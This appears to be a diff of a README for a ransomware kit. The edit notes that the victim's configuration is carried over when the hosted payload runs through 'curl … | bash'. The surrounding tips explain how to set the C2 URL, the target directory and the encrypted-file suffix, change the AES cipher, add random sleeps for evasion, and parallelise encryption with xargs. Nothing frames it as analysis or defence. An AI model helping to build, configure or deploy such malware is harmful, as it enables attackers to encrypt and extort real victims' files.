@@ -111,7 +111,7 @@ pkill -f c2_server.py
 
 ## Customization tips
 
-- **Environment configuration:** update `.env` (or provide `ENV_FILE_PATH=/path/to/file`) to set `C2_URL`, `TARGET_DIR`, and the encrypted file suffix without editing scripts. Running `setup.sh` now renders these values directly into the hosted payload so remote victims inherit your configuration automatically.
+- **Environment configuration:** update `.env` (or provide `ENV_FILE_PATH=/path/to/file`) to set `C2_URL`, `TARGET_DIR`, and the encrypted file suffix without editing scripts. Running `setup.sh` now renders these values directly into the hosted payload so remote victims inherit your configuration automatically, even when executing via `curl … | bash`.
 - **Cipher suite:** change the `openssl enc -aes-256-*` invocation.
 - **Evasion delays:** insert `sleep $((RANDOM % 10))` or similar pauses.
 - **Parallelization:** leverage `xargs -P 8 -I {} …` for multi-threaded encryption.
